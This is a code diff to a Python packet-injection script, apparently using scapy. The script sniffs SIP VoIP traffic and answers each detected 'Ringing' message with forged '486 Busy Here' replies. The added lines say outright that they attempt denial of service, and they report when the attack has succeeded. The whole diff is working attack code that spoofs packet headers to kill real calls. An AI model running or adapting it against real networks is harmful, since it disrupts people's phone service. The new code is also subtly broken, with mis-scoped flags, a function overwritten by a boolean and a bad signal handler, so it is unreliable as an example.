@@ -4,6 +4,17 @@ import re
 import codecs
 import argparse
 import time
+import signal
+
+
+# global flag to listen for ACK after BUSY was sent
+sent_busy=False
+
+interrupt=False
+
+def busy_timeout():
+    interrupt=True
+
 
 def traffic_parser(packet):
     BUSY_1 = 'SIP/2.0 486 Busy Here'
@@ -18,8 +29,13 @@ def traffic_parser(packet):
     print("----------------------------------------------------------------------")
 
 
-    header=re.findall("Ringing", str(payload))
-    if header:
+    Ringing_header=re.findall("Ringing", str(payload))
+    ACK_header=re.findall("ACK", str(payload))
+
+    if Ringing_header:
+
+        sent_busy=True
+        print("New call detected.\nAttempting denial of service with Busy reply from Receiver")
         
         eth_attributes={}
         eth_attributes['dst']=packet[Ether].dst
@@ -44,9 +60,9 @@ def traffic_parser(packet):
         payload = re.sub("Contact\:.*>", BUSY_2, payload,1)
         # print(payload.replace('\\\\', '\\'))
         # payload = payload.replace("\\\\", "\\")
-        print(payload.encode("ascii","ignore"))
+        # print(payload.encode("ascii","ignore"))
 
-        time.sleep(1)
+        # time.sleep(1)
 
         for incr in range(1,5):
 
@@ -55,7 +71,6 @@ def traffic_parser(packet):
             ip_attributes['tos']=packet[IP].tos
             ip_attributes['len']=511 #packet[IP].len
             ip_attributes['id']=packet[IP].id+incr
-            # ip_attributes['id']=0
             ip_attributes['flags']=packet[IP].flags
             ip_attributes['frag']=packet[IP].frag
             ip_attributes['ttl']=packet[IP].ttl
@@ -70,6 +85,16 @@ def traffic_parser(packet):
 
             # print(payload)
             # print(Raw(load=payload))
+            sent_busy=True
+            busy_timeout=False
+        signal.alarm(2)
+    
+    elif ACK_header:
+
+        if sent_busy and (not busy_timeout):
+            print("Busy message attack was successfull!")
+
+
 
 def Ether_layer(attributes):
     layer2=Ether()
@@ -114,6 +139,8 @@ parser.add_argument('-t', "--testfile", help="parse test file (optional)")
 args=parser.parse_args()
 
 if __name__ == '__main__':
+
+    signal.signal(signal.SIGALRM, busy_timeout)
 
     if args.testfile:
         packets = rdpcap(args.testfile)
